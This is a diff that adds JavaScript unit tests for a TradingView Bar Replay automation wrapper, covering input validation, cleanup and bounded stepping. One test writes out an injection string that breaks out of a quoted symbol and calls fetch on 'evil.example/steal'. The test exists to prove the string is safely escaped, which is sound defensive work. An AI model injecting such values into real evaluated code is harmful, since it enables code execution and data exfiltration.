@@ -117,6 +117,120 @@ test("setSymbol/setResolution roll the chart back before rejecting", async () =>
   assert.ok(resExpr.includes("chart.setResolution(before, finish)"), "resolution rollback uses the previous timeframe");
 });
 
+test("Bar Replay status is read-only and normalizes watched values", async () => {
+  const cdp = fakeCdp({ available: true, started: false });
+  const result = await new TradingView(cdp).getReplayStatus();
+  assert.equal(result.available, true);
+  const expr = cdp.calls[0];
+  assert.match(expr, /replay\.currentDate\(\)/);
+  assert.match(expr, /typeof value\.value === "function"/);
+  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
+});
+
+test("startReplay validates and context-binds the requested historical instant", async () => {
+  const tv = new TradingView(fakeCdp());
+  assert.throws(
+    () => tv.startReplay({ startAt: "not-a-date", expectedSymbol: "OANDA:EURUSD", expectedResolution: "60" }),
+    /valid ISO-8601/,
+  );
+  assert.throws(
+    () => tv.startReplay({ startAt: "2999-01-01T00:00:00.000Z", expectedSymbol: "OANDA:EURUSD", expectedResolution: "60" }),
+    /must be in the past/,
+  );
+  assert.throws(
+    () => tv.startReplay({ startAt: "2025-01-01T00:00:00.000Z", expectedSymbol: "", expectedResolution: "60" }),
+    /expectedSymbol/,
+  );
+
+  const cdp = fakeCdp({ requestedStartAt: "2025-01-01T00:00:00.000Z", status: {} });
+  const hostile = `OANDA:EURUSD"); fetch("https://evil.example/steal"); ("`;
+  await new TradingView(cdp).startReplay({
+    startAt: "2025-01-01T00:00:00.000Z",
+    expectedSymbol: hostile,
+    expectedResolution: "60",
+  });
+  const expr = cdp.calls[0];
+  assert.ok(expr.includes(JSON.stringify(hostile)));
+  assert.ok(!expr.includes(`const expectedSymbol = "${hostile}"`));
+  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
+  assert.match(expr, /active chart symbol does not match expectedSymbol/);
+  assert.match(expr, /replay\.selectDate\(1735689600000\)/);
+  assert.match(expr, /Bar Replay did not start within 20 seconds/);
+  assert.match(expr, /await replay\.stopReplay\(\)/);
+  assert.match(expr, /and cleanup also failed/);
+});
+
+test("startReplay cleans up a partially opened toolbar when date selection fails", async () => {
+  let expr = "";
+  const cdp = { evaluate: async (value) => { expr = value; return {}; } };
+  await new TradingView(cdp).startReplay({
+    startAt: "2025-01-01T00:00:00.000Z",
+    expectedSymbol: "OANDA:EURUSD",
+    expectedResolution: "60",
+  });
+  const state = { toolbar: false, started: false };
+  let stopCalls = 0;
+  const watched = (read) => ({ value: read });
+  const replay = {
+    currentDate: () => watched(() => null),
+    getReplaySelectedDate: () => watched(() => null),
+    replayResolutions: () => watched(() => []),
+    currentReplayResolution: () => watched(() => null),
+    autoReplayResolution: () => watched(() => "60"),
+    isReplayAvailable: () => watched(() => true),
+    isReplayToolbarVisible: () => watched(() => state.toolbar),
+    isReplayStarted: () => watched(() => state.started),
+    isReadyToPlay: () => watched(() => false),
+    isAutoplayStarted: () => watched(() => false),
+    isJumpToBarModeEnabled: () => watched(() => false),
+    autoplayDelay: () => 1000,
+    selectDate: async () => {
+      state.toolbar = true;
+      throw new Error("select failed");
+    },
+    stopReplay: async () => {
+      stopCalls += 1;
+      state.toolbar = false;
+      state.started = false;
+    },
+  };
+  const context = {
+    window: {
+      TradingViewApi: {
+        replayApi: async () => replay,
+        activeChart: () => ({ symbol: () => "OANDA:EURUSD", resolution: () => "60" }),
+        activeChartIndex: () => 0,
+      },
+    },
+    Date,
+    setTimeout,
+  };
+  await assert.rejects(vm.runInNewContext(expr, context), /select failed/);
+  assert.equal(stopCalls, 1);
+  assert.equal(state.toolbar, false);
+});
+
+test("stepReplay is bounded, paused-only, and verifies time advancement", async () => {
+  const tv = new TradingView(fakeCdp());
+  for (const bad of [0, 101, 1.5]) assert.throws(() => tv.stepReplay(bad), /steps must be/);
+  const cdp = fakeCdp({ requestedSteps: 3, completedSteps: 3, reachedEnd: false });
+  await new TradingView(cdp).stepReplay(3);
+  const expr = cdp.calls[0];
+  assert.match(expr, /pause Bar Replay autoplay before stepping/);
+  assert.match(expr, /await replay\.doStep\(\)/);
+  assert.match(expr, /current\.currentTime !== prior/);
+  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition|toggleAutoplay)\(/);
+});
+
+test("stopReplay closes the toolbar and verifies real-time mode", async () => {
+  const cdp = fakeCdp({ changed: true, before: {}, after: {} });
+  await new TradingView(cdp).stopReplay();
+  const expr = cdp.calls[0];
+  assert.match(expr, /await replay\.stopReplay\(\)/);
+  assert.match(expr, /Bar Replay did not stop within 10 seconds/);
+  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
+});
+
 test("getOhlcv bars carry timeIso and a forming flag heuristic", async () => {
   const cdp = fakeCdp({ symbol: "X", resolution: "1D", count: 0, bars: [] });
   const tv = new TradingView(cdp);
